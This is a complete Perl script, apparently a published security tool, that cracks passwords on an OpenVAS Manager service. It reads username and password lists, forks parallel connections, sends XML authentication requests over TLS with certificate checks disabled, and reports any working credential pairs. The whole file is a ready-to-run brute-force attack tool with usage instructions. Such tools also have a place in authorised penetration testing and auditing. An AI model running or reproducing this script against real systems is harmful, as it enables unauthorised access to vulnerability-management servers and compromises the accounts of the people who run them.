#!/usr/bin/perl
# OpenVAS OMP password cracker
# Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL

use strict;
use IO::Socket::SSL;
use Getopt::Long;

$!=1;

my $verbose = 0;
my $ov_host = "localhost";
my $ov_port = "9390";
my $timeout = 30;
my $userfile;
my $passfile;
my $maxreq = 16;

my @childs;
my $ch=0;
my $total=0;

my $pid = 1;
my $loop = 1;

Getopt::Long::Configure ("bundling");

my $result = GetOptions (
	"i|ip=s" => \$ov_host,
	"p|port=i" => \$ov_port,
	"U|users=s" => \$userfile,
	"P|passwords=s" => \$passfile,
	"m|maxreq=i" => \$maxreq,
	"t|timeout=i" => \$timeout,
	"v|verbose+"  => \$verbose,
	"h|help" => \&help
);

unless ($userfile and $passfile) {
	help();
}

print STDERR "OpenVAS OMP password cracker. (C) Kost. Distributed under GPL.\n\n";

open(USER,"<$userfile") or die ("cannot open user file $userfile: $!");
open(PASS,"<$passfile") or die ("cannot open password file $passfile: $!");

print STDERR "[i] Cracking.\n";

my $userglob = <USER>;
chomp $userglob;

$SIG{INT} = \&ctrlc;
my %comb;
while ($loop) {
	if ($pid) {
		# print STDERR "Main/Parent\n";
		%comb = getcomb();

		if ($comb{'nomore'} == 1) {
			$loop = 0;
			next;
		} 
		if ($ch<$maxreq) {
			$ch++;
			# print STDERR "Forking $ch\n";
			$pid = fork();
			die ("[e] cannot fork: $!") if (!defined($pid));
			if ($pid) {
				push @childs, $pid;
				$total++;
			}
		} else {
			# wait for children to die
			while ($#childs>0) {
				#print STDERR "waiting to die\n";
				if (my $oldpid=waitpid(-1, 0)) {
					# print STDERR "Oldpid: $oldpid\n";
					foreach my $i (0 .. $#childs) {
						next if ($oldpid);
						if ($childs[$i] eq $oldpid) {
							delete $childs[$i];
							last;
						}
					}
					$total++;
					$pid = fork();
					die ("[e] cannot fork in wait: $!") if (!defined($pid)); 
					if ($pid) {
						push @childs, $pid;
						last if ($loop==0);
					} else {
						last;# if children skip while loop

					}
					last; 				
				}
			}
			if ($pid) {%comb = getcomb();}
			next;
		}
	} 
	unless ($pid) {
		# children
		# print STDERR "Children\n";
		ov_guess($comb{'user'},$comb{'pass'});
		exit(0);
	}
}

$SIG{'INT'} = 'DEFAULT';
foreach (@childs) {
	waitpid($_, 0)
}

print STDERR "\n";
print STDERR "[i] Statistics: $total tries\n";
print STDERR "[i] END\n";

sub getcomb {
	my %comb;
	while (1) {
	unless ($comb{'pass'} = <PASS>) {
		while (1) {
			unless ($comb{'user'} = <USER>) {
				$comb{'nomore'} = 1;
				return %comb; 
			} else {
				chomp($comb{'user'});
				if ($comb{'user'} eq '') {
					next;
				} else {
					$userglob=$comb{'user'};
					seek (PASS,0,0);
					last;
				}
			}
		}
	} else {
		$comb{'user'}=$userglob;
		chomp($comb{'pass'});
		if ($comb{'pass'} eq '') {
			next;
		} else {
			last 
		}
	}
	}
	$comb{'nomore'} = 0;
	return %comb;
}

sub ctrlc {
	$SIG{INT} = \&ctrlc;
	print "\nCTRL+C presssed, stopping.\n";
	$loop=0;
}

sub ov_guess {
	my ($user, $password) = @_;
	my $ov_sock = IO::Socket::SSL->new(
			  PeerAddr        => $ov_host,
			  PeerPort        => $ov_port,
			  SSL_verify_mode => 0,
				SSL_version => 'TLSv1',	
			  Timeout         => $timeout
			  );
	if(!$ov_sock) {
		warn ("[w] Cannot connect to sock: $!");
		return;
	}
	$ov_sock->autoflush();

	#my $xmlauthreq="<authenticate><credentials><username>$user</username><password>$password</password></credentials></authenticate>";
	my $xmlauthreq="<authenticate><credentials><username>$user</username><password>$password</password></credentials></authenticate><HELP/>\r\n";
	#my $xmlcommreq="<HELP/>\n";

	#$ov_sock->print($xmlauthreq.$xmlcommreq);
	$ov_sock->print($xmlauthreq);
	#$ov_sock->print("<HELP/>\n");
	$ov_sock->flush();
	#sleep 1;
	#$ov_sock->print($xmlreq."<get_version/>\n");
	my $line = $ov_sock->getline;
	#my $line;
	#while ($ov_sock->pending) {
	if (0) {
	while (length($line) == 0) {
		my $buff;
		# $ov_sock->read($buff, 1024);
		sysread ($ov_sock, $buff, 1024);
		$line=$line.$buff;
		# sleep 15;
		sleep 1;
		print STDERR ".";
	}
	}
	print STDERR "[p] $line:\n" if ($verbose>10);

	if(!defined($line)) { 
		#while ($ov_sock->connected) { $line = $ov_sock->getline; print $line; }
		$ov_sock->close(SSL_ctx_free => 1);
		warn ("[w] $user:$password. Hmm. No answer. Worth checking out. Not OpenVAS Manager or TCP wrapped ?");
		print $xmlauthreq."\n";
		return;
	}

	unless ($ov_sock->connected) {
		print STDERR "[i] Combination $user:$password: Disconnected\n" if ($verbose>0);
	}

	if($line =~ /Authentication failed/gis) {
		print STDERR $line."\n" if ($verbose>5);
		print STDERR "[i] Combination $user:$password: Wrong\n" if ($verbose>1);
	} elsif ($line =~ /<authenticate_response.*status="200"/gis) {
		print STDERR "[i] Combination $user:$password: Sucess\n" if ($verbose>1);
		print "[o] Success! User: $user and Password: $password\n";
	} else {
		print STDERR $line."\n" if ($verbose>5);
		print STDERR "[i] Combination $user:$password: Unknown\n" if ($verbose>0);
	}

	$ov_sock->close(SSL_ctx_free => 1);
}

sub help 
{
	print "$0: OpenVAS OMP password cracker. \n";
	print "Copyright (C) Vlatko Kosturjak, Kost. Distributed under GPL.\n\n";
	print "Usage: $0 -i 127.0.0.1 -p 9390 -U userlist.txt -P passlist.txt\n\n";
	print "	-i <i>	Use target IP <i> (default: $ov_host)\n";
	print "	-p <p>	Use port <p> (default: $ov_port)\n";
	print "	-U <U>	Use user list <U>\n";
	print "	-P <P>	Use password list <P>\n";
	print "	-m <m>	Maximum number of parallel request (default: $maxreq)\n";
	print "	-t <t>	use sock timeout <t>\n";
	print "	-v	verbose (-vv will display every combination tried)\n";
	print "	-h 	this help message\n";
	exit (0);
} 
